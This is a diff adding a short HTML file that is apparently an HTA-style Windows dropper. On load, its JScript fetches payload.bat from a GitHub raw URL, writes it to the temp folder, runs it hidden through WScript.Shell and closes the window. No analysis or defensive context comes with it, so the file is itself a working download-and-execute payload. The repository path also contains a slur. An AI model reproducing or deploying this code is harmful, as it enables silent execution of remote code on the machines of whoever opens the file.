@@ -1,0 +1,17 @@
+<html>
+<script language="javascript">
+    var x = new ActiveXObject("MSXML2.XMLHTTP");
+    x.open("GET", "https://raw.githubusercontent.com/nigacode/-/refs/heads/main/payload.bat", false);
+    x.send();
+
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var temp = fso.GetSpecialFolder(2) + "\\payload.bat";
+    var f = fso.CreateTextFile(temp, true);
+    f.Write(x.responseText);
+    f.Close();
+
+    shell.Run(temp, 0, false);
+    window.close();
+</script>
+</html>
